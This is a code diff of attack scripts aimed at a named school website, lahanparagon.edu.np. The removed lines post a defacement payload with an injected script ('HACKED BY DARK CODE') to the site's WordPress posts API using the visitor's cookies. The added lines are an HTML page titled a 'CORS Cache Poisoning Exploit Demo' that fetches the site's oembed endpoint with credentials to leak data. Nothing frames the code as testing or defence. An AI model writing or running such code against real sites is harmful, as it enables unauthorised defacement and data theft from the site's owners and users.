@@ -1,39 +1,31 @@
-const payload = {
-  title: "Hacked DARKCODE",
-  content: "<script>alert('HACKED BY DARK CODE')</script>", 
-  status: "publish"
-};
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CORS Cache Poisoning Exploit Demo</title>
+</head>
+<body>
+  <h1>Trying to Leak Data from Vulnerable Site</h1>
+  <button id="fetchBtn">Fetch Sensitive Data</button>
+  <pre id="output" style="white-space: pre-wrap; background:#eee; padding:10px; margin-top:10px;"></pre>
 
-fetch("https://lahanparagon.edu.np/wp-json/wp/v2/posts", {
-  method: "POST",
-  credentials: "include", // send cookies
-  headers: {
-    "Content-Type": "application/json",
-    // You might need authorization headers if the endpoint requires authentication
-    // "Authorization": "Bearer YOUR_TOKEN" 
-  },
-  body: JSON.stringify(payload)
-})
-.then(response => {
-  if (!response.ok) {
-    throw new Error(`HTTP error! status: ${response.status}`);
-  }
-  return response.json();
-})
-.then(data => {
-  const outputElement = document.getElementById('output');
-  if (outputElement) {
-    outputElement.textContent = "✅ Request Sent Successfully:\n\n" + 
-      JSON.stringify(data, null, 2);
-  } else {
-    console.log("✅ Request Sent Successfully:", data);
-  }
-})
-.catch(error => {
-  const outputElement = document.getElementById('output');
-  if (outputElement) {
-    outputElement.textContent = "❌ Request Failed:\n\n" + error.message;
-  } else {
-    console.error("❌ Request Failed:", error);
-  }
-});
+  <script>
+    document.getElementById('fetchBtn').onclick = function() {
+      fetch('https://lahanparagon.edu.np/wp-json/oembed/1.0/embed', {
+        method: 'GET',
+        credentials: 'include' // send cookies if any
+      })
+      .then(response => {
+        if (!response.ok) throw new Error('Network response was not ok: ' + response.status);
+        return response.text(); // or response.json() if JSON expected
+      })
+      .then(data => {
+        document.getElementById('output').textContent = '✅ Data received:\n\n' + data;
+      })
+      .catch(error => {
+        document.getElementById('output').textContent = '❌ Fetch error:\n\n' + error.message;
+      });
+    }
+  </script>
+</body>
+</html>
